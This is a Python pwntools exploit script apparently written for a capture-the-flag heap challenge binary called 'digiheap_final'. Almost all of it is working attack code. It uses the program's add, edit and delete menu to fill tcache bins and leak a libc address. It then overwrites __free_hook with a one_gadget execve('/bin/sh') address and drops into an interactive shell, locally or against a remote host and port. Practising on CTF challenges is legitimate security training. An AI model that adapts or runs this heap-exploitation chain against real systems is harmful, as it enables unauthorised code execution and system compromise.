from pwn import *

main=0x00401ae9
monster_add=0x004011d5
monster_show=0x00401852
monster_edit=0x00401560
monster_delete=0x00401709

BINARY = './digiheap_final'
LIBC = './libc.so.6'

def add_monster(idx, desclen=0, desc=None, health=1, attack=1, defense=1, speed=1):
	p.sendline('1')
	p.recvuntil('Select index:')
	p.sendline(str(idx))
	p.recvuntil('value:')
	p.sendline(str(health))
	p.recvuntil('value:')
	p.sendline(str(attack))
	p.recvuntil('value:')
	p.sendline(str(defense))
	p.recvuntil('value:')
	p.sendline(str(speed))


	p.recvuntil('(Y/N):')
	if desc:
		p.sendline('Y')

		p.recvuntil('Size:')
		p.sendline(str(desclen))
		p.recvuntil('description:')
		p.sendline(desc)

	else:
		p.sendline('N')


def add_monster_empty(idx, desclen=0, desc='foo', health=1, attack=1, defense=1, speed=1):
	p.sendline('1')
	p.recvuntil('Select index:')
	p.sendline(str(idx))
	p.recvuntil('value:')
	p.sendline(str(health))
	p.recvuntil('value:')
	p.sendline(str(health))
	p.recvuntil('value:')
	p.sendline(str(health))
	p.recvuntil('value:')
	p.sendline(str(health))


	p.recvuntil('(Y/N):')
	if desc:
		p.sendline('Y')

		p.recvuntil('Size:')
		p.sendline(str(desclen))
		p.recvuntil('description:')
		p.send('\n')

	else:
		p.sendline('N')


def show_monster(idx):
	p.recvuntil('>>')
	p.recv()
	p.sendline('4')
	p.recv()
	p.sendline(str(idx))

	health = p.recvuntil('\n').decode().split(': ')[1].strip()
	attack = p.recvuntil('\n').decode().split(': ')[1].strip()
	defense = p.recvuntil('\n').decode().split(': ')[1].strip()
	speed = p.recvuntil('\n').decode().split(': ')[1].strip()
	description = p.recvuntil('\n\n').decode().split(': ')[1].strip()

def delete_monster(idx):
	p.recvuntil('>>')
	p.recv()
	p.sendline('3')
	p.recv()
	p.sendline(str(idx))
	p.recvuntil('successfully.')

def edit_monster(idx, desc):
	p.recvuntil('>>')
	p.recv()
	p.sendline('2')
	p.recv()
	p.sendline(str(idx))
	p.recvuntil('description:')
	p.sendline(desc)

def show_monster_leak(idx):
	p.recvuntil('>>')
	p.recv()
	p.sendline('4')
	p.recv()
	p.sendline(str(idx))

	health = p.recvuntil('\n').decode().split(': ')[1].strip()
	attack = p.recvuntil('\n').decode().split(': ')[1].strip()
	defense = p.recvuntil('\n').decode().split(': ')[1].strip()
	speed = p.recvuntil('\n').decode().split(': ')[1].strip()
	description = p.recvuntil('\n').decode().split(': ')[1].strip()

	leak = (u64(p.recvuntil('\n\n').strip().ljust(8, b'\x00')) << 8) + 0x90
	libc_base = leak - 0x1E4D90

	log.success("Libc-Leak @ 0x{:x}".format(leak))
	log.success("Libc-Base @ 0x{:x}".format(libc_base)) 

	return libc_base

def free_spawn(idx):
	p.recvuntil('>>')
	p.recv()
	p.sendline('3')
	p.recv()
	p.sendline(str(idx))
	p.interactive()


def pwn():
	log.info('Main @ 0x{:x}'.format(main))
	log.info('Add monster @ 0x{:x}'.format(monster_add))
	log.info('Edit monster @ 0x{:x}'.format(monster_edit))
	log.info('Delete monster @ 0x{:x}'.format(monster_delete))
	log.info('Show monster @ 0x{:x}'.format(monster_show))



	##########  
	add_monster(0, 0xf0, 'A'*0xf0)


	for i in range(7):
		add_monster(i+2, 0xf0, 'B'*0xf0)
	for i in range(7):
		delete_monster(i+2)

	delete_monster(0)
	
	add_monster_empty(0, 0xe0)
	libc_base = show_monster_leak(0)

	delete_monster(0)

	##### Pruebas

	libc = ELF(LIBC)
	libc.address = libc_base
	free_hook = libc.symbols['__free_hook']

	'''
	0xe21ce execve("/bin/sh", r15, r13)
	constraints:
	  [r15] == NULL || r15 == NULL
	  [r13] == NULL || r13 == NULL

	0xe21d1 execve("/bin/sh", r15, rdx)
	constraints:
	  [r15] == NULL || r15 == NULL
	  [rdx] == NULL || rdx == NULL

	0xe21d4 execve("/bin/sh", rsi, rdx)
	constraints:
	  [rsi] == NULL || rsi == NULL
	  [rdx] == NULL || rdx == NULL

	0xe237f execve("/bin/sh", rcx, [rbp-0x70])
	constraints:
	  [rcx] == NULL || rcx == NULL
	  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

	0xe2383 execve("/bin/sh", rcx, rdx)
	constraints:
	  [rcx] == NULL || rcx == NULL
	  [rdx] == NULL || rdx == NULL

	0x106ef8 execve("/bin/sh", rsp+0x70, environ)
	constraints:
	  [rsp+0x70] == NULL

	'''
	one_gadget = libc.address + 0xe2383

	log.success("Free-Hook @ 0x{:x}".format(free_hook))
	log.success("One Gadget @ 0x{:x}".format(one_gadget))

	add_monster(1, 0x18, b'Z'*0x10 + p64(free_hook))
	delete_monster(1)

	add_monster(0, 0x30, 'X'*0x30)
	add_monster(0)


	edit_monster(0, p64(one_gadget))

	log.success("Got shell!")
	free_spawn(0)

	##############



if __name__ == "__main__":
	log.info("For remote: %s HOST PORT" % sys.argv[0])
	if len(sys.argv) > 2:
		p = remote(sys.argv[1], int(sys.argv[2]))
		pwn()
	else:
		# Debug
		if len(sys.argv) > 1 and sys.argv[1] == '-d':
			p = gdb.debug(BINARY,'''
			continue
			'''.format(BINARY))

		else:
			p = process(BINARY)

		pwn()